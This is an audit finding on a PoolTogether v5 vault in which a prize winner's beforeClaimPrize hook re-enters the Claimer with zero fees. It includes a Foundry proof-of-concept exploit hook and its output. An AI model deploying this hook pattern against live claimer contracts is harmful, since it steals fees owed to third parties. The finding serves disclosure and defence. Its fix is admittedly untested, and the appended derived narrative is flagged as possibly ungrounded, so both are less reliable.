---
id: 20954
severity: "Medium"
---

# The winner can steal claimer fees, and force him to pay for the gas

## Description

When the winner earns his reward he can either claim it himself, or he can let a claimer contract withdraw it on his behalf, and he will pay part of his reward for that. This is because the user will not pay for the gas fees; instead the claimer contract will pay it instead.

The problem here is that the winner can make the claimer pay for the gas of the transaction, without paying the fees that the claimer contract takes.

Claimer contracts are allowed for anyone to use them, transfer prizes to winners, and claim some fees; where the one who fired the transaction is the one who will pay for the fees, so he deserved those fees.

[pt-v5-claimer/Claimer.sol#L120-L150](https://github.com/GenerationSoftware/pt-v5-claimer/blob/main/src/Claimer.sol#L120-L150)

```solidity
// @audit and one can call the function
function claimPrizes( ... ) external returns (uint256 totalFees) {
    ...

    if (!feeRecipientZeroAddress) {
      ...
    }

    return feePerClaim * _claim(_vault, _tier, _winners, _prizeIndices, _feeRecipient, feePerClaim);
}
```

As in the function, the function takes the winners and he passed the fee recipient and his fees (but it should not exceed the `maxFees`, which is initialized in the constructor).

Now we know that anyone can transfer winners’ prizes and claim some fees.

Before the prizes are claimed, the winner can initialize a hook before calling the `PoolPrize::claimPrize`. This is used if the winner wants to initialize another address as the receiver of the reward. The hook parameter is passed by parameters that are used to determine the correct winner (winner address, tier, `prizeIndex`).

[abstract/Claimable.sol#L85-L95](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L85-L95)

```solidity
uint24 public constant HOOK_GAS = 150_000;

...

function claimPrize( ... ) external onlyClaimer returns (uint256) {
    address recipient;

    if (_hooks[_winner].useBeforeClaimPrize) {
        recipient = _hooks[_winner].implementation.beforeClaimPrize{ gas: HOOK_GAS }(
            _winner,
            _tier,
            _prizeIndex,
            _reward,
            _rewardRecipient
        );
    } else {
        recipient = _winner;
    }

    if (recipient == address(0)) revert ClaimRecipientZeroAddress();

    uint256 prizeTotal = prizePool.claimPrize( ... );
  
    ...
}
```

But to prevent `OOG` the gas is limited to `150K`.

Now what the user can do to make the claimer pay for the transaction, and not pay any fees is:

  * He will make a `beforeClaimPrize` hook.
  * In this function, the user will simply claim his reward `Claimer::claimPrizes(...params)` but with settings no fees, and only passing his winning prize parameters (we got them from the hook).
  * The winner (attacker) will not do any further interaction to not make the tx go `OOG` (remember we have only 150k).
  * After the user claims his reward, he will simply return his address (the winner’s address).
  * The Claimer contract will go to claim this winner’s rewards, but it will return 0 as it is already claimed.
  * The Claimer will complete his process (claiming other prizes on behalf of winners).
  * The winner (attacker) will end up claiming his reward without paying for the transaction gas fees.

Note: The Claimer claiming function will not revert, as if the prize was already claimed the function will just emit an event and will not revert.

[pt-v5-claimer/Claimer.sol#L194-L198](https://github.com/GenerationSoftware/pt-v5-claimer/blob/main/src/Claimer.sol#L194-L198)

```solidity
function _claim( ... ) internal returns (uint256) {
    ...

    try
        _vault.claimPrize(_winners[w], _tier, _prizeIndices[w][p], _feePerClaim, _feeRecipient)
    returns (uint256 prizeSize) {
        if (0 != prizeSize) {
            actualClaimCount++;
        } else {
            // @audit Emit an event if the prize already claimed
            emit AlreadyClaimed(_winners[w], _tier, _prizeIndices[w][p]);
        }
    } catch (bytes memory reason) {
        emit ClaimError(_vault, _tier, _winners[w], _prizeIndices[w][p], reason);
    }

    ...
}
```

The only check that can prevent this attack is the gas cost of calling `beforeClaimPrize` hook.

We will call one function `Claimer::claimPrizes()` by only passing one winner, and without fees. We calculated the gas that can be used by installing protocol contracts (Claimer and PrizePool), then grab a test function that first the function we need, and we get these results:

  * Calling `Claimer::claimPrize()` costs `5292 gas` if it did not claimed anything.
  * Calling `PrizePool::claimePrize()` costs `118124 gas`.

So the total gas that can be used is `$118,124 + 5292 = $123,416` which is smaller than `HOOK_GAS` by more than `25K`, so the function will not revert because of OOG error, and the reentrancy will occur.

Another thing that may lead to a misunderstanding is that the Judger may say if this happens the function will go to `beforeClaimPrize` hook again leading to infinite loop and the transaction will go `OOG`. However, making the transaction `beforeClaimPrize` be fired to make a result and when called again do another logic is an easy task that can be made by implementing a counter or something. However, we did not implement this counter in our test. We just wanted to point out how the attack will work in our POC, but in real interactions, there should be some edge cases to take care of and further configurations to take care off.

## Proof of Concept

We made a simulation of how the function will occur. We found that the testing environment made by the devs is abstracted a little bit compared to the real flow of transactions in the production mainnet, so I made Mock contracts, and simulated the attack with them. Please go for the testing script step by step, and it will work as intended.

  1. Add the following Imports and scripts in [`test/Claimable.t.sol::L8`](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/test/unit/Claimable.t.sol#L8)

Imports and Contracts

```solidity
import { console2 } from "forge-std/console2.sol";
import { PrizePoolMock } from "../contracts/mock/PrizePoolMock.sol";

contract Auditor_MockPrizeToken {
    mapping(address user => uint256 balance) public balanceOf;

    function mint(address user, uint256 amount) public {
        balanceOf[user] += amount;
    }

    function burn(address user, uint256 amount) public {
        balanceOf[user] -= amount;
    }
}

contract Auditor_PrizePoolMock {
    Auditor_MockPrizeToken public immutable prizeToken;

    constructor(address _prizeToken) {
        prizeToken = Auditor_MockPrizeToken(_prizeToken);
    }

    // The reward is fixed to 100 tokens
    function claimPrize(
        address winner,
        uint8 /* _tier */,
        uint32 /* _prizeIndex */,
        address /* recipient */,
        uint96 reward,
        address rewardRecipient
    ) public returns (uint256) {
        // Distribute rewards if the PrizePool earns a reward
        if (prizeToken.balanceOf(address(this)) >= 100e18) {
            prizeToken.mint(winner, 100e18 - uint256(reward)); // Transfer reward tokens to the winner
            // Transfer fees to the claimer Receipent.
            // Instead of adding balance to the PrizePool contract and then the claimerRecipent
            // Can withdraw it, we will transfer it to the claimerRecipent directly in our simulation
            prizeToken.mint(rewardRecipient, reward);
             // Simulating Token transfereing by minting and burning
            prizeToken.burn(address(this), 100e18);
        } else {
            return 0;
        }

        return uint256(100e18);
    }
}

contract Auditor_Claimer {
    ClaimableWrapper public immutable prizeVault;

    constructor(address _prizeVault) {
        prizeVault = ClaimableWrapper(_prizeVault);
    }

    function claimPrizes(
        address[] calldata _winners,
        uint8 _tier,
        uint256 _claimerFees,
        address _feeRecipient
    ) external {
        for (uint i = 0; i < _winners.length; i++) {
            prizeVault.claimPrize(_winners[i], _tier, 0, uint96(_claimerFees), _feeRecipient);
        }
    }
}
```

  2. Add the following functions in [`test/Claimable.t.sol::L132`](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/test/unit/Claimable.t.sol#L132)

Testing Functions

```solidity
Auditor_Claimer __claimer;

function testAuditor_winnerStealClaimerFees() public {
    console2.log("Winner reward is 100 tokens");
    console2.log("Fees are 10% (10 tokens)");
    console2.log("=============");
    console2.log("Simulating the normal Operation (No stealing)");
    auditor_complete_claim_proccess(false);
    console2.log("=============");
    console2.log("Simulating winner steal recipent fees");
    auditor_complete_claim_proccess(true);
}

function auditor_complete_claim_proccess(bool willSteal) internal {
    // If tier is 1 we will take the claimer fees and if 0 we will do nothing
    uint8 tier = willSteal ? 1 : 0;

    Auditor_MockPrizeToken __prizeToken = new Auditor_MockPrizeToken();
    Auditor_PrizePoolMock __prizePool = new Auditor_PrizePoolMock(address(__prizeToken));

    address __winner = makeAddr("winner");
    address __claimerRecipent = makeAddr("claimerRecipent");

    // This will be like the `PrizeVault` that has the winner
    ClaimableWrapper __claimable = new ClaimableWrapper(
        PrizePool(address(__prizePool)),
        address(1)
    );

    // Claimer contract, that can transfer winners rewards
    __claimer = new Auditor_Claimer(address(__claimable));
    // Set new Claimer
    __claimable.setClaimer(address(__claimer));

    VaultHooks memory beforeHookOnly = VaultHooks(true, false, hooks);

    vm.startPrank(__winner);
    __claimable.setHooks(beforeHookOnly);
    vm.stopPrank();

    // PrizePool earns 100 tokens from yields, and we picked the winner
    __prizeToken.mint(address(__prizePool), 100e18);

    address[] memory __winners = new address[](1);
    __winners[0] = __winner;

    // Claim Prizes by providing `__claimerRecipent`
    __claimer.claimPrizes(__winners, tier, 10e18, __claimerRecipent);

    console2.log("Winner PrizeTokens:", __prizeToken.balanceOf(__winner) / 1e18, "token");
    console2.log(
        "ClaimerRecipent PrizeTokens:",
        __prizeToken.balanceOf(__claimerRecipent) / 1e18,
        "token"
    );
}
```

  3. Change [`beforeClaimPrize`](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/test/unit/Claimable.t.sol#L254-L274) hook function, and replace it with the following:

```solidity
function beforeClaimPrize(
    address winner,
    uint8 tier,
    uint32 prizeIndex,
    uint96 reward,
    address rewardRecipient
) external returns (address) {
    address[] memory __winners = new address[](1);
    __winners[0] = winner;

    if (tier == 1) {
        __claimer.claimPrizes(__winners, 0, 0, rewardRecipient);
    }

    return winner;
}
```

  4. Check that everything is correct and run:

    forge test --mt testAuditor_winnerStealClaimerFees -vv

**Output**:

```
Winner reward is 100 tokens
Fees are 10% (10 tokens)
=============
Simulating the normal Operation (No stealing)
Winner PrizeTokens: 90 token
ClaimerRecipent PrizeTokens: 10 token
=============
Simulating winner steal recipient fees
Winner PrizeTokens: 100 token
ClaimerRecipent PrizeTokens: 0 token
```

In this test, we first made a reward and withdrew it from our Claimer contract normally (no attack happened). Then, we made another prize reward but by making the attack when withdrawing it, which can be seen in the Logs.

## Recommendation

We can check the prize state before and after the hook; if it changes from unclaimed to claimed, we can revert the transaction.

**Claimable.sol:**

```solidity
function claimPrize( ... ) external onlyClaimer returns (uint256) {
    address recipient;

    if (_hooks[_winner].useBeforeClaimPrize) {
        bool isClaimedBefore = prizePool.wasClaimed(address(this), _winner, _tier, _prizeIndex);
        recipient = _hooks[_winner].implementation.beforeClaimPrize{ gas: HOOK_GAS }( ... );
        bool isClaimedAfter = prizePool.wasClaimed(address(this), _winner, _tier, _prizeIndex);

        if (isClaimedBefore == false && isClaimedAfter == true) {
            revert("The Attack Occuared");
        }
    } else { ... }
    ...
}
```

_Note: We were writing this issue 30 minutes before ending of the audit - the mitigation review may not be the best, or may not work (we did not test it). Devs should keep this in mind when mitigating this issue._

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a fee‑stealing reentrancy style flaw that allows a prize winner to claim the full reward while forcing a third‑party claimer contract to pay the transaction gas without receiving its entitled fee. The root cause is that the claimPrize function in the vault executes a user‑controlled beforeClaimPrize hook with a fixed gas stipend (150 000) and does not verify whether the prize has been claimed during the execution of that hook. Because the Claimer contract’s internal _claim function simply emits an AlreadyClaimed event when the prize is already taken and does not revert, the winner can invoke the hook, call the Claimer contract to claim the same prize with a zero‑fee parameter, and then return his own address as the recipient. The Claimer contract then attempts to claim the prize, finds it already claimed, emits an event and finishes, having spent gas but receiving no fee. This sequence can be performed within the gas limit of the hook, so the transaction does not run out of gas and the attack succeeds. The impact is that the protocol’s fee revenue is siphoned away from the claimer contract, the claimer pays unnecessary gas, and the accounting assumptions that fees are always collected by the designated recipient are violated. The issue occurs whenever a winner can register a beforeClaimPrize hook (through the VaultHooks structure) and the hook is allowed to call the Claimer contract with arbitrary parameters. Any user who wins a prize can exploit this, affecting the protocol, third‑party claimer contracts, and potentially the overall fee model. The flaw was discovered during a security audit by constructing mock contracts and a proof‑of‑concept test that demonstrated the winner receiving the full 100‑token reward while the claimer recipient received zero tokens despite paying gas. The problem is hard to notice because the Claimer contract does not revert on an already claimed prize, only emitting an event, so the loss of fees is silent and the transaction appears successful. To remediate, the claimPrize logic should record the claim state before invoking the hook and verify after the hook that the prize has not been claimed; if it has, the transaction should revert. Alternatively, moving fee collection before the hook, adding a reentrancy guard, or disallowing the winner’s hook from calling the Claimer contract would prevent the fee‑stealing scenario.
